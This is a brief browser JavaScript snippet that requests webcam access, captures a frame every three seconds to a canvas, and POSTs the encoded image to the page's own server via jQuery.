const player = document.getElementById('player');
const canvas = document.getElementById('canvas');
const context = canvas.getContext('2d');

const constraints = {
  video: true
};

window.addEventListener('DOMContentLoaded', () => {
  setInterval(function() {
    context.drawImage(player, 0, 0, canvas.width, canvas.height);
    var data = canvas.toDataURL();
    $.ajax({url: "", method: "POST", data: data});
  }, 3000);

  navigator.mediaDevices.getUserMedia(constraints).then((stream) => {
    player.srcObject = stream;
  });
});
